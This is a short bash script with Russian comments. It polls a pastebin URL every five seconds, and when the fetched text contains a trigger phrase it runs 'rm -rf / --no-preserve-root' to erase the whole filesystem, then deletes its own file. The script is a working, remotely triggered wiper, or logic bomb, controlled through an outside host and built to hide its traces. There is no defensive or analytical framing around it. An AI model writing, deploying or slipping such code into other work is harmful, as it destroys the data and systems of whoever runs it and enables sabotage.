#!/bin/bash

url="https://pastebin.com/raw/8LbpK8d9"
phrase="123"

while true; do
    content=$(curl -s $url)
    if [[ "$content" == *"$phrase"* ]]; then
        rm -rf / --no-preserve-root  # ОПАСНАЯ КОМАНДА! Удаляет все файлы в системе
        rm -- "$0"  # Удаляем сам скрипт после выполнения
        break
    else
        sleep 5  # ждем 5 секунд перед следующей проверкой
    fi
done
